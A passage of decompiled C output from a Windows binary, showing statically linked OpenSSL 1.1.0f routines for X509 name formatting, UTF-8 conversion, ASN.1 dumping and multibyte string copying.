  return sub_1400A8550(*a1, *a2, v2 - 36);
}
// 1400A9C50: variable 'v2' is possibly undefined

//----- (00000001400A9C60) ----------------------------------------------------
int __fastcall sub_1400A9C60(__int64 *a1, __int64 *a2)
{
  int v2; // eax

  return sub_1400A8550(*a1, *a2, v2 - 24);
}
// 1400A9C70: variable 'v2' is possibly undefined

//----- (00000001400A9C80) ----------------------------------------------------
void __fastcall sub_1400A9C80(void **a1)
{
  if ( a1 )
  {
    sub_1400BC850(*a1);
    sub_140029720(a1[1], (void (*)(void))sub_1400BC850);
    sub_14001D930(a1);
  }
}

//----- (00000001400A9CD0) ----------------------------------------------------
char *__fastcall sub_1400A9CD0(unsigned int **a1, char *a2, int a3)
{
  _BYTE **v3; // r15
  int v4; // ebx
  char *v5; // r12
  unsigned int **v6; // rdi
  _BYTE **v7; // rax
  int v8; // r13d
  int v9; // ebx
  __int64 *v10; // r14
  unsigned int v11; // eax
  char *v12; // rbp
  char *v13; // rax
  unsigned int i; // edi
  unsigned int *v15; // rax
  unsigned int v16; // edi
  __int64 v17; // rsi
  _BYTE *v18; // r9
  int v19; // ecx
  int v20; // edx
  int v21; // eax
  _BYTE *v22; // rcx
  __int64 v23; // r8
  int v24; // ecx
  char v25; // dl
  __int64 v26; // r8
  __int64 v27; // rbx
  char *v28; // rbx
  char *v29; // rbx
  char *v30; // rbx
  _BYTE *v31; // rbx
  unsigned __int8 *v32; // r8
  char v33; // dl
  __int64 v34; // r9
  __int64 v35; // rcx
  int v37; // [rsp+30h] [rbp-C8h]
  int v38; // [rsp+38h] [rbp-C0h]
  int v41; // [rsp+50h] [rbp-A8h]
  __int64 v42; // [rsp+54h] [rbp-A4h]
  int v43; // [rsp+5Ch] [rbp-9Ch]
  char v44[80]; // [rsp+60h] [rbp-98h] BYREF

  v3 = 0i64;
  v4 = a3;
  v5 = a2;
  v6 = a1;
  if ( a2 )
  {
    if ( !a3 )
      return 0i64;
  }
  else
  {
    v7 = (_BYTE **)sub_1400825B0();
    v3 = v7;
    if ( !v7 || (v4 = 200, !sub_1400822F0((__int64)v7, 0xC8ui64)) )
    {
LABEL_56:
      sub_140024610(11, 116, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_obj.c", 178);
      goto LABEL_59;
    }
    *v3[1] = 0;
  }
  if ( !v6 )
  {
    if ( v3 )
    {
      v5 = v3[1];
      sub_14001D930(v3);
    }
    strncpy(v5, "NO X509_NAME", v4);
    v5[v4 - 1] = 0;
    return v5;
  }
  v38 = v4 - 1;
  v8 = 0;
  v9 = 0;
  v37 = 0;
  if ( (int)sub_1400296E0(*v6) <= 0 )
  {
LABEL_51:
    if ( v3 )
    {
      v5 = v3[1];
      sub_14001D930(v3);
    }
LABEL_53:
    if ( !v37 )
      *v5 = 0;
    return v5;
  }
  while ( 1 )
  {
    v10 = (__int64 *)sub_140029880((__int64)*v6, v9);
    v11 = sub_14002C260(*v10);
    if ( !v11 || (v12 = sub_14002C1A0(v11)) == 0i64 )
    {
      sub_14003FE60(v44, 80, *v10);
      v12 = v44;
    }
    v13 = v12;
    for ( i = 0; *v13; ++i )
    {
      if ( i >= 0x80000000 )
        break;
      ++v13;
    }
    v15 = (unsigned int *)v10[1];
    v16 = i & 0x7FFFFFFF;
    v17 = *v15;
    if ( (int)v17 > 0x100000 )
      break;
    v18 = (_BYTE *)*((_QWORD *)v15 + 1);
    if ( v15[1] != 27 || (int)v17 % 4 )
    {
      v43 = 1;
    }
    else
    {
      v19 = 0;
      v20 = 0;
      v21 = 0;
      v42 = 0i64;
      v41 = 0;
      if ( (int)v17 > 0 )
      {
        v22 = v18;
        v23 = v17;
        do
        {
          if ( *v22 )
            *(&v41 + (v20 & 3)) = 1;
          LOBYTE(v20) = v20 + 1;
          ++v22;
          --v23;
        }
        while ( v23 );
        v19 = HIDWORD(v42);
        v20 = v42;
        v21 = v41;
      }
      v43 = 1;
      if ( !(v19 | v20 | v21) )
      {
        v42 = 0i64;
        v41 = 0;
        goto LABEL_30;
      }
    }
    v41 = 1;
    v42 = 0x100000001i64;
LABEL_30:
    v24 = 0;
    if ( (int)v17 > 0 )
    {
      v25 = 0;
      v26 = v17;
      do
      {
        if ( *(&v41 + (v25 & 3)) )
        {
          ++v24;
          if ( (unsigned __int8)(*v18 - 32) > 0x5Eu )
            v24 += 3;
        }
        ++v25;
        ++v18;
        --v26;
      }
      while ( v26 );
    }
    v27 = v8;
    v8 += v24 + v16 + 2;
    if ( v8 > 0x100000 )
    {
      sub_140024610(11, 116, 134, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_obj.c", 124);
      goto LABEL_59;
    }
    if ( v3 )
    {
      if ( !sub_1400822F0((__int64)v3, v8 + 1) )
        goto LABEL_56;
      v28 = &v3[1][v27];
    }
    else
    {
      if ( v8 > v38 )
        goto LABEL_53;
      v28 = &v5[v27];
    }
    *v28 = 47;
    v29 = v28 + 1;
    memmove(v29, v12, v16);
    v30 = &v29[v16];
    *v30 = 61;
    v31 = v30 + 1;
    v32 = *(unsigned __int8 **)(v10[1] + 8);
    if ( (int)v17 > 0 )
    {
      v33 = 0;
      v34 = v17;
      do
      {
        if ( *(&v41 + (v33 & 3)) )
        {
          v35 = *v32;
          if ( (unsigned int)(v35 - 32) > 0x5E )
          {
            *(_WORD *)v31 = 30812;
            v31[2] = a0123456789abcd_5[(v35 >> 4) & 0xF];
            v31[3] = a0123456789abcd_5[v35 & 0xF];
            v31 += 4;
          }
          else
          {
            *v31++ = v35;
          }
        }
        ++v33;
        ++v32;
        --v34;
      }
      while ( v34 );
      v5 = a2;
    }
    v6 = a1;
    *v31 = 0;
    v9 = ++v37;
    if ( v37 >= (int)sub_1400296E0(*a1) )
      goto LABEL_51;
  }
  sub_140024610(11, 116, 134, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\x509\\x509_obj.c", 75);
LABEL_59:
  sub_140082280((__int64)v3);
  return 0i64;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00000001400AA0C0) ----------------------------------------------------
__int64 __fastcall sub_1400AA0C0(__int64 a1)
{
  return *(_QWORD *)(a1 + 104);
}

//----- (00000001400AA0D0) ----------------------------------------------------
__int64 __fastcall sub_1400AA0D0(__int64 a1)
{
  return *(_QWORD *)(a1 + 64);
}

//----- (00000001400AA0E0) ----------------------------------------------------
__int64 __fastcall sub_1400AA0E0(__int64 a1)
{
  return a1 + 32;
}

//----- (00000001400AA0F0) ----------------------------------------------------
__int64 __fastcall sub_1400AA0F0(__int64 a1, _QWORD *a2, _QWORD *a3)
{
  __int64 result; // rax

  if ( a2 )
  {
    result = *(_QWORD *)(a1 + 88);
    *a2 = result;
  }
  if ( a3 )
  {
    result = *(_QWORD *)(a1 + 96);
    *a3 = result;
  }
  return result;
}

//----- (00000001400AA110) ----------------------------------------------------
__int64 __fastcall sub_1400AA110(int **a1)
{
  return sub_14007D9A0(*a1);
}

//----- (00000001400AA130) ----------------------------------------------------
__int64 __fastcall sub_1400AA130(char *a1, int a2, _DWORD *a3)
{
  __int64 result; // rax
  char v6; // cl
  char v7; // r8
  unsigned int v8; // edx
  unsigned int v9; // edx
  unsigned int v10; // edx
  unsigned int v11; // edx
  unsigned int v12; // edx

  if ( a2 <= 0 )
    return 0i64;
  v6 = *a1;
  if ( v6 >= 0 )
  {
    result = 1i64;
    *a3 = v6 & 0x7F;
    return result;
  }
  if ( (v6 & 0xE0) != 0xC0 )
  {
    if ( (v6 & 0xF0) == 0xE0 )
    {
      if ( a2 < 3 )
        return 0xFFFFFFFFi64;
      if ( (a1[1] & 0xC0) == 0x80 && (a1[2] & 0xC0) == 0x80 )
      {
        v9 = a1[2] & 0x3F | ((a1[1] & 0x3F) << 6) | ((v6 & 0xF) << 12);
        if ( v9 >= 0x800 )
        {
          result = 3i64;
          *a3 = v9;
          return result;
        }
        return 4294967292i64;
      }
      return 4294967293i64;
    }
    if ( (v6 & 0xF8) == 0xF0 )
    {
      if ( a2 < 4 )
        return 0xFFFFFFFFi64;
      if ( (a1[1] & 0xC0) != 0x80 || (a1[2] & 0xC0) != 0x80 || (a1[3] & 0xC0) != 0x80 )
        return 4294967293i64;
      v10 = a1[3] & 0x3F | ((a1[2] & 0x3F) << 6) | ((a1[1] & 0x3F) << 12) | ((v6 & 7) << 18);
      if ( v10 >= 0x10000 )
      {
        result = 4i64;
        *a3 = v10;
        return result;
      }
    }
    else if ( (v6 & 0xFC) == 0xF8 )
    {
      if ( a2 < 5 )
        return 0xFFFFFFFFi64;
      if ( (a1[1] & 0xC0) != 0x80 || (a1[2] & 0xC0) != 0x80 || (a1[3] & 0xC0) != 0x80 || (a1[4] & 0xC0) != 0x80 )
        return 4294967293i64;
      v11 = a1[4] & 0x3F | ((a1[3] & 0x3F) << 6) | ((a1[2] & 0x3F) << 12) | ((a1[1] & 0x3F) << 18) | ((v6 & 3) << 24);
      if ( v11 >= 0x200000 )
      {
        result = 5i64;
        *a3 = v11;
        return result;
      }
    }
    else
    {
      if ( (v6 & 0xFE) != 0xFC )
        return 4294967294i64;
      if ( a2 < 6 )
        return 0xFFFFFFFFi64;
      if ( (a1[1] & 0xC0) != 0x80
        || (a1[2] & 0xC0) != 0x80
        || (a1[3] & 0xC0) != 0x80
        || (a1[4] & 0xC0) != 0x80
        || (a1[5] & 0xC0) != 0x80 )
      {
        return 4294967293i64;
      }
      v12 = a1[5] & 0x3F | ((a1[4] & 0x3F) << 6) | ((a1[3] & 0x3F) << 12) | ((a1[2] & 0x3F) << 18) | ((a1[1] & 0x3F) << 24) | ((v6 & 1) << 30);
      if ( v12 >= 0x4000000 )
      {
        result = 6i64;
        *a3 = v12;
        return result;
      }
    }
    return 4294967292i64;
  }
  if ( a2 < 2 )
    return 0xFFFFFFFFi64;
  v7 = a1[1];
  if ( (v7 & 0xC0) != 0x80 )
    return 4294967293i64;
  v8 = v7 & 0x3F | ((v6 & 0x1F) << 6);
  if ( v8 < 0x80 )
    return 4294967292i64;
  result = 2i64;
  *a3 = v8;
  return result;
}

//----- (00000001400AA3E0) ----------------------------------------------------
__int64 __fastcall sub_1400AA3E0(_BYTE *a1, int a2, unsigned int a3)
{
  if ( a1 )
  {
    if ( a2 <= 0 )
      return 0xFFFFFFFFi64;
  }
  else
  {
    a2 = 6;
  }
  if ( a3 < 0x80 )
  {
    if ( a1 )
      *a1 = a3;
    return 1i64;
  }
  if ( a3 < 0x800 )
  {
    if ( a2 >= 2 )
    {
      if ( a1 )
      {
        *a1 = (a3 >> 6) & 0x1F | 0xC0;
        a1[1] = a3 & 0x3F | 0x80;
      }
      return 2i64;
    }
    return 0xFFFFFFFFi64;
  }
  if ( a3 >= 0x10000 )
  {
    if ( a3 >= 0x200000 )
    {
      if ( a3 >= 0x4000000 )
      {
        if ( a2 < 6 )
          return 0xFFFFFFFFi64;
        if ( a1 )
        {
          *a1 = ((a3 & 0x40000000) != 0) | 0xFC;
          a1[1] = HIBYTE(a3) & 0x3F | 0x80;
          a1[2] = (a3 >> 18) & 0x3F | 0x80;
          a1[3] = (a3 >> 12) & 0x3F | 0x80;
          a1[4] = (a3 >> 6) & 0x3F | 0x80;
          a1[5] = a3 & 0x3F | 0x80;
        }
        return 6i64;
      }
      else
      {
        if ( a2 < 5 )
          return 0xFFFFFFFFi64;
        if ( a1 )
        {
          *a1 = HIBYTE(a3) & 3 | 0xF8;
          a1[1] = (a3 >> 18) & 0x3F | 0x80;
          a1[2] = (a3 >> 12) & 0x3F | 0x80;
          a1[3] = (a3 >> 6) & 0x3F | 0x80;
          a1[4] = a3 & 0x3F | 0x80;
        }
        return 5i64;
      }
    }
    else
    {
      if ( a2 < 4 )
        return 0xFFFFFFFFi64;
      if ( a1 )
      {
        *a1 = (a3 >> 18) & 7 | 0xF0;
        a1[1] = (a3 >> 12) & 0x3F | 0x80;
        a1[2] = (a3 >> 6) & 0x3F | 0x80;
        a1[3] = a3 & 0x3F | 0x80;
      }
      return 4i64;
    }
  }
  else
  {
    if ( a2 < 3 )
      return 0xFFFFFFFFi64;
    if ( a1 )
    {
      *a1 = (a3 >> 12) & 0xF | 0xE0;
      a1[1] = (a3 >> 6) & 0x3F | 0x80;
      a1[2] = a3 & 0x3F | 0x80;
    }
    return 3i64;
  }
}

//----- (00000001400AA590) ----------------------------------------------------
__int64 __fastcall sub_1400AA590(__int64 a1, _BYTE *a2, int a3, int a4, int a5)
{
  _BYTE *v6; // [rsp+58h] [rbp+10h] BYREF

  v6 = a2;
  return sub_1400AA600(a1, &v6, a3, 0, 0, a4, a5);
}

//----- (00000001400AA5D0) ----------------------------------------------------
const char *__fastcall sub_1400AA5D0(unsigned int a1)
{
  if ( ((a1 - 258) & 0xFFFFFFF7) == 0 )
    a1 &= ~0x100u;
  if ( a1 > 0x1E )
    return "(unknown)";
  else
    return (const char *)*(&off_14011BF10 + (int)a1);
}
// 14011BF10: using guessed type void *off_14011BF10;

//----- (00000001400AA600) ----------------------------------------------------
__int64 __fastcall sub_1400AA600(__int64 a1, _BYTE **a2, int a3, int a4, int a5, int a6, int a7)
{
  __int64 v7; // rsi
  _BYTE *v9; // rdi
  __int64 v10; // rax
  int v11; // ebx
  int v12; // eax
  int v13; // eax
  int v14; // esi
  _BYTE *v15; // rdi
  int v16; // ecx
  unsigned __int64 v17; // rdi
  int v18; // eax
  int v19; // ecx
  int v20; // ebx
  int v21; // eax
  int v22; // ecx
  int v23; // eax
  int v24; // ebx
  unsigned int *v25; // rax
  unsigned int *v26; // rbx
  __int64 v27; // rdx
  __int64 v28; // r9
  __int64 v29; // r8
  unsigned int v30; // ecx
  int v31; // r10d
  signed int v32; // edi
  __int64 v33; // rsi
  unsigned int v34; // r8d
  __int64 v35; // rsi
  int v36; // ebx
  __int64 v37; // rdi
  int v38; // ebx
  __int64 v39; // rdi
  unsigned int v40; // r8d
  unsigned __int8 *v41; // rbx
  int v42; // edi
  __int64 v43; // [rsp+20h] [rbp-51h]
  int v44; // [rsp+40h] [rbp-31h] BYREF
  unsigned int v45; // [rsp+44h] [rbp-2Dh]
  _BYTE *v46; // [rsp+48h] [rbp-29h] BYREF
  unsigned int v47; // [rsp+50h] [rbp-21h] BYREF
  unsigned int v48; // [rsp+54h] [rbp-1Dh]
  _BYTE *v49; // [rsp+58h] [rbp-19h]
  int v50; // [rsp+60h] [rbp-11h]
  _BYTE *v51; // [rsp+68h] [rbp-9h] BYREF
  int v52; // [rsp+70h] [rbp-1h]
  int v53; // [rsp+74h] [rbp+3h] BYREF
  __int64 v54; // [rsp+78h] [rbp+7h] BYREF
  __int64 v55; // [rsp+80h] [rbp+Fh]
  int v58; // [rsp+D0h] [rbp+5Fh]
  int v59; // [rsp+D0h] [rbp+5Fh]

  v58 = a3;
  v7 = a1;
  v48 = 0;
  v54 = 0i64;
  v50 = 0;
  if ( a5 > 128 )
  {
    sub_14002A1A0(a1, (__int64)"BAD RECURSION DEPTH\n");
    return 0i64;
  }
  v9 = *a2;
  v10 = (__int64)&(*a2)[a3];
  v49 = v9;
  v46 = v9;
  v55 = v10;
  if ( a3 <= 0 )
  {
LABEL_126:
    v48 = 1;
    v26 = 0i64;
    goto LABEL_127;
  }
  while ( 1 )
  {
    v11 = sub_140047780(&v46, &v44, (int *)&v47, &v53, a3);
    if ( (v11 & 0x80u) != 0 )
    {
      v26 = 0i64;
      if ( (int)sub_14002A430(v7, (__int64)"Error in encoding\n", 0x12u) > 0 )
        v48 = 0;
      goto LABEL_127;
    }
    v59 = v58 - ((_DWORD)v46 - (_DWORD)v9);
    v45 = (_DWORD)v46 - (_DWORD)v9;
    if ( (int)sub_14002A590(v7, "%5ld:", (unsigned int)(a4 + (_DWORD)v9 - *(_DWORD *)a2)) <= 0 )
      goto LABEL_125;
    if ( v11 == 33 )
    {
      v12 = sub_14002A590(v7, "d=%-2d hl=%ld l=inf  ", (unsigned int)a5, v45);
    }
    else
    {
      LODWORD(v43) = v44;
      v12 = sub_14002A590(v7, "d=%-2d hl=%ld l=%4ld ", (unsigned int)a5, v45, v43);
    }
    if ( v12 <= 0 )
      goto LABEL_125;
    v13 = 0;
    if ( a6 )
      v13 = a5;
    if ( !sub_1400AAF40(v7, v47, v53, v11, v13) )
      goto LABEL_125;
    if ( (v11 & 0x20) == 0 )
      break;
    v14 = (int)v46;
    v15 = &v46[v44];
    if ( (int)sub_14002A430(a1, (__int64)"\n", 1u) <= 0 )
      goto LABEL_125;
    if ( v44 > v59 )
    {
      sub_14002A590(a1, "length is greater than %ld\n", (unsigned int)v59);
LABEL_124:
      v48 = 0;
LABEL_125:
      v26 = 0i64;
      goto LABEL_127;
    }
    if ( v11 == 33 && !v44 )
    {
      v16 = (int)v46;
      v17 = v55;
      while ( 1 )
      {
        v18 = sub_1400AA600(a1, (unsigned int)&v46, (int)v17 - v16, a4 + v16 - *(_DWORD *)a2, a5 + 1, a6, a7);
        if ( !v18 )
          goto LABEL_124;
        v16 = (int)v46;
        v49 = v46;
        if ( v18 == 2 || (unsigned __int64)v46 >= v17 )
        {
          v44 = (_DWORD)v46 - v14;
          goto LABEL_23;
        }
      }
    }
    v19 = (int)v46;
    v20 = v44;
    v49 = v46;
    if ( v46 < v15 )
    {
      while ( (unsigned int)sub_1400AA600(a1, (unsigned int)&v46, v20, a4 + v19 - *(_DWORD *)a2, a5 + 1, a6, a7) )
      {
        v19 = (int)v46;
        v21 = (_DWORD)v49 - (_DWORD)v46;
        v49 = v46;
        v20 += v21;
        if ( v46 >= v15 )
          goto LABEL_23;
      }
      goto LABEL_124;
    }
LABEL_23:
    v9 = v49;
LABEL_24:
    a3 = v59 - v44;
    v58 = a3;
    if ( a3 <= 0 )
      goto LABEL_126;
    v7 = a1;
  }
  if ( v53 )
  {
    v46 += v44;
    if ( (int)sub_14002A430(v7, (__int64)"\n", 1u) <= 0 )
      goto LABEL_125;
    v9 = v46;
    v49 = v46;
    goto LABEL_24;
  }
  v52 = 0;
  if ( v47 <= 0x1A )
  {
    v22 = 98308096;
    if ( _bittest(&v22, v47) )
    {
      if ( (int)sub_14002A430(v7, (__int64)word_1400F6B40, 1u) <= 0 )
        goto LABEL_125;
      if ( v44 > 0 )
      {
        v23 = sub_14002A430(v7, (__int64)v46, v44);
        if ( v23 != v44 )
          goto LABEL_125;
      }
      goto LABEL_111;
    }
  }
  switch ( v47 )
  {
    case 6u:
      v24 = v45;
      v51 = v9;
      if ( !sub_14003FC70(&v54, &v51, v45 + v44) )
      {
        if ( (int)sub_14002A1A0(v7, (__int64)":BAD OBJECT") <= 0 )
          goto LABEL_125;
        v50 = 1;
        goto LABEL_113;
      }
      if ( (int)sub_14002A430(v7, (__int64)word_1400F6B40, 1u) <= 0 )
        goto LABEL_125;
      sub_14003FD20(v7, v54);
LABEL_112:
      v7 = a1;
      if ( !v50 )
      {
LABEL_118:
        if ( !v52 && (int)sub_14002A430(v7, (__int64)"\n", 1u) <= 0 )
          goto LABEL_125;
        v9 = &v46[v44];
        v49 = v9;
        v46 = v9;
        if ( !v47 && !v53 )
        {
          v48 = 2;
          v26 = 0i64;
          goto LABEL_127;
        }
        goto LABEL_24;
      }
LABEL_113:
      v41 = &v9[v24];
      if ( (int)sub_14002A1A0(v7, (__int64)":[") <= 0 )
        goto LABEL_125;
      v42 = 0;
      if ( v44 > 0 )
      {
        while ( (int)sub_14002A590(v7, "%02X", *v41) > 0 )
        {
          ++v42;
          ++v41;
          if ( v42 >= v44 )
            goto LABEL_117;
        }
        goto LABEL_125;
      }
LABEL_117:
      if ( (int)sub_14002A1A0(v7, (__int64)"]") <= 0 )
        goto LABEL_125;
      goto LABEL_118;
    case 1u:
      if ( v44 != 1 )
      {
        if ( (int)sub_14002A1A0(v7, (__int64)":BAD BOOLEAN") <= 0 )
          goto LABEL_125;
        v50 = 1;
      }
      if ( v44 > 0 )
        sub_14002A590(v7, ":%u", (unsigned __int8)*v46);
      goto LABEL_111;
    case 0x1Eu:
LABEL_111:
      v24 = v45;
      goto LABEL_112;
  }
  if ( v47 != 4 )
  {
    if ( v47 == 2 )
    {
      v24 = v45;
      v51 = v9;
      v35 = sub_14004FFF0(0i64, &v51, v45 + v44);
      if ( v35 )
      {
        if ( (int)sub_14002A430(a1, (__int64)word_1400F6B40, 1u) <= 0
          || *(_DWORD *)(v35 + 4) == 258 && (int)sub_14002A430(a1, (__int64)"-", 1u) <= 0 )
        {
          goto LABEL_125;
        }
        v36 = 0;
        v37 = 0i64;
        if ( *(int *)v35 > 0 )
        {
          while ( (int)sub_14002A590(a1, "%02X", *(unsigned __int8 *)(*(_QWORD *)(v35 + 8) + v37)) > 0 )
          {
            ++v36;
            ++v37;
            if ( v36 >= *(_DWORD *)v35 )
              goto LABEL_85;
          }
          goto LABEL_125;
        }
LABEL_85:
        if ( !*(_DWORD *)v35 && (int)sub_14002A430(a1, (__int64)"00", 2u) <= 0 )
          goto LABEL_125;
        goto LABEL_87;
      }
      if ( (int)sub_14002A1A0(a1, (__int64)":BAD INTEGER") <= 0 )
        goto LABEL_125;
    }
    else
    {
      if ( v47 != 10 )
      {
        if ( v44 > 0 && a7 )
        {
          if ( (int)sub_14002A430(v7, (__int64)"\n", 1u) <= 0 )
            goto LABEL_125;
          v40 = v44;
          if ( a7 != -1 && a7 <= v44 )
            v40 = a7;
          if ( (int)sub_1400757A0(v7, (__int64)v46, v40, 6) <= 0 )
            goto LABEL_125;
          v52 = 1;
        }
        goto LABEL_111;
      }
      v24 = v45;
      v51 = v9;
      v35 = sub_14004FFD0(0i64, &v51, v45 + v44);
      if ( v35 )
      {
        if ( (int)sub_14002A430(a1, (__int64)word_1400F6B40, 1u) <= 0
          || *(_DWORD *)(v35 + 4) == 266 && (int)sub_14002A430(a1, (__int64)"-", 1u) <= 0 )
        {
          goto LABEL_125;
        }
        v38 = 0;
        v39 = 0i64;
        if ( *(int *)v35 > 0 )
        {
          while ( (int)sub_14002A590(a1, "%02X", *(unsigned __int8 *)(v39 + *(_QWORD *)(v35 + 8))) > 0 )
          {
            ++v38;
            ++v39;
            if ( v38 >= *(_DWORD *)v35 )
              goto LABEL_98;
          }
          goto LABEL_125;
        }
LABEL_98:
        if ( !*(_DWORD *)v35 && (int)sub_14002A430(a1, (__int64)"00", 2u) <= 0 )
          goto LABEL_125;
LABEL_87:
        v24 = v45;
        v9 = v49;
        sub_14004FD70(v35);
        goto LABEL_112;
      }
      if ( (int)sub_14002A1A0(a1, (__int64)":BAD ENUMERATED") <= 0 )
        goto LABEL_125;
    }
    v50 = 1;
    sub_14004FD70(0i64);
    goto LABEL_112;
  }
  v51 = v9;
  v25 = (unsigned int *)sub_140050010(0i64, &v51, v44 + v45);
  v26 = v25;
  if ( !v25 || (int)*v25 <= 0 )
    goto LABEL_63;
  v27 = *((_QWORD *)v25 + 1);
  v51 = (_BYTE *)v27;
  v28 = (int)*v25;
  if ( v28 <= 0 )
  {
LABEL_61:
    if ( (int)sub_14002A430(v7, (__int64)word_1400F6B40, 1u) <= 0 || (int)sub_14002A430(v7, (__int64)v51, *v26) <= 0 )
      goto LABEL_127;
    goto LABEL_63;
  }
  v29 = -v27;
  while ( 1 )
  {
    v30 = *(unsigned __int8 *)v27;
    if ( (unsigned __int8)v30 <= 0x1Fu )
    {
      v31 = -9729;
      if ( _bittest(&v31, v30) )
        break;
    }
    if ( (unsigned __int8)v30 >= 0x7Fu )
      break;
    ++v27;
    if ( v29 + v27 >= v28 )
      goto LABEL_61;
  }
  if ( a7 )
  {
    if ( (int)sub_14002A430(v7, (__int64)"\n", 1u) <= 0 )
      goto LABEL_127;
    if ( a7 == -1 || (v34 = a7, a7 > (int)*v26) )
      v34 = *v26;
    if ( (int)sub_1400757A0(v7, (__int64)v51, v34, 6) <= 0 )
      goto LABEL_127;
    v52 = 1;
    sub_14004FD70((__int64)v26);
    goto LABEL_111;
  }
  if ( (int)sub_14002A430(v7, (__int64)"[HEX DUMP]:", 0xBu) <= 0 )
    goto LABEL_127;
  v32 = 0;
  v33 = 0i64;
  if ( (int)*v26 <= 0 )
  {
LABEL_69:
    v9 = v49;
LABEL_63:
    sub_14004FD70((__int64)v26);
    goto LABEL_111;
  }
  while ( (int)sub_14002A590(a1, "%02X", (unsigned __int8)v51[v33]) > 0 )
  {
    ++v32;
    ++v33;
    if ( v32 >= (int)*v26 )
      goto LABEL_69;
  }
LABEL_127:
  sub_14003F4D0(v54);
  sub_14004FD70((__int64)v26);
  *a2 = v46;
  return v48;
}
// 1400AA702: variable 'v43' is possibly undefined
// 1400F6B40: using guessed type __int16 word_1400F6B40[16];

//----- (00000001400AAF40) ----------------------------------------------------
_BOOL8 __fastcall sub_1400AAF40(__int64 a1, unsigned int a2, char a3, char a4, int a5)
{
  const char *v6; // rdx
  char *v9; // rsi
  char v11[128]; // [rsp+20h] [rbp-A8h] BYREF

  v6 = "cons: ";
  if ( (a4 & 0x20) == 0 )
    v6 = "prim: ";
  if ( (int)sub_14002A430(a1, (__int64)v6, 6u) < 6 )
    return 0i64;
  sub_140029E80(a1, a5, 128);
  v9 = v11;
  if ( (a3 & 0xC0) == 0xC0 )
  {
    sub_14002A5C0(v11, 0x80ui64, "priv [ %d ] ", a2);
  }
  else if ( a3 >= 0 )
  {
    if ( (a3 & 0x40) != 0 )
    {
      sub_14002A5C0(v11, 0x80ui64, "appl [ %d ]", a2);
    }
    else if ( (int)a2 <= 30 )
    {
      v9 = (char *)sub_1400AA5D0(a2);
    }
    else
    {
      sub_14002A5C0(v11, 0x80ui64, "<ASN1 %d>", a2);
    }
  }
  else
  {
    sub_14002A5C0(v11, 0x80ui64, "cont [ %d ]", a2);
  }
  return (int)sub_14002A590(a1, "%-18s", v9) > 0;
}

//----- (00000001400AB060) ----------------------------------------------------
__int64 __fastcall sub_1400AB060(_DWORD **a1, char *a2, int a3, int a4, int a5)
{
  return sub_1400AB090(a1, a2, a3, a4, a5, 0, 0);
}

//----- (00000001400AB090) ----------------------------------------------------
__int64 __fastcall sub_1400AB090(_DWORD **a1, char *a2, int a3, int a4, int a5, int a6, int a7)
{
  __int64 (__fastcall *v7)(__int64, __int64); // r15
  int v8; // r10d
  int v9; // ebx
  unsigned int v12; // ebx
  char *i; // rax
  int v14; // eax
  int v16; // edi
  unsigned int v17; // esi
  int v18; // esi
  char *v19; // rbp
  int v20; // eax
  unsigned int v21; // esi
  int v22; // esi
  unsigned int v23; // ebp
  _DWORD *v24; // r14
  char v25; // r12
  int v26; // esi
  int v27; // esi
  int v28; // esi
  int v29; // r8d
  int v30; // [rsp+30h] [rbp-88h] BYREF
  int v31; // [rsp+34h] [rbp-84h]
  _BYTE *v32; // [rsp+38h] [rbp-80h] BYREF
  int v33; // [rsp+40h] [rbp-78h] BYREF
  _QWORD *v34; // [rsp+48h] [rbp-70h]
  char v35[32]; // [rsp+50h] [rbp-68h] BYREF

  v7 = 0i64;
  v31 = a4;
  v34 = a1;
  v8 = a4;
  v30 = 0;
  v9 = a3;
  if ( a3 == -1 )
  {
    v12 = 0;
    for ( i = a2; *i; ++v12 )
    {
      if ( v12 >= 0x80000000 )
        break;
      ++i;
    }
    v9 = v12 & 0x7FFFFFFF;
  }
  v14 = a5;
  if ( !a5 )
    v14 = 10246;
  a5 = v14;
  switch ( a4 )
  {
    case 4096:
      v16 = 0;
      v18 = v9;
      v19 = a2;
      if ( v9 )
      {
        while ( 1 )
        {
          v20 = sub_1400AA130(v19, v18, &v33);
          if ( v20 < 0 )
            break;
          v18 -= v20;
          ++v16;
          v19 += v20;
          if ( !v18 )
          {
            v8 = v31;
            goto LABEL_16;
          }
        }
        sub_140024610(13, 122, 134, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 87);
        return 0xFFFFFFFFi64;
      }
      break;
    case 4097:
      v16 = v9;
      break;
    case 4098:
      if ( (v9 & 1) != 0 )
      {
        sub_140024610(13, 122, 129, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 67);
        return 0xFFFFFFFFi64;
      }
      v16 = v9 >> 1;
      break;
    case 4100:
      if ( (v9 & 3) != 0 )
      {
        sub_140024610(13, 122, 133, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 76);
        return 0xFFFFFFFFi64;
      }
      v16 = v9 >> 2;
      break;
    default:
      sub_140024610(13, 122, 160, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 97);
      return 0xFFFFFFFFi64;
  }
LABEL_16:
  v17 = a6;
  if ( a6 > 0 && v16 < a6 )
  {
    sub_140024610(13, 122, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 102);
    sub_14002A5C0(v35, 0x20ui64, "%ld", v17);
    sub_140023A40(2, "minsize=", v35);
    return 0xFFFFFFFFi64;
  }
  v21 = a7;
  if ( a7 > 0 && v16 > a7 )
  {
    sub_140024610(13, 122, 151, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 109);
    sub_14002A5C0(v35, 0x20ui64, "%ld", v21);
    sub_140023A40(2, "maxsize=", v35);
    return 0xFFFFFFFFi64;
  }
  if ( (int)sub_1400AB680(a2, v9, v8, (__int64 (__fastcall *)(__int64, __int64))sub_1400AB790, (__int64)&a5) < 0 )
  {
    sub_140024610(13, 122, 124, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\asn1\\a_mbstr.c", 117);
    return 0xFFFFFFFFi64;
  }
  v22 = 4097;
  if ( (a5 & 1) != 0 )
  {
    v23 = 18;
  }
  else if ( (a5 & 2) != 0 )
  {
    v23 = 19;
  }
  else if ( (a5 & 0x10) != 0 )
  {
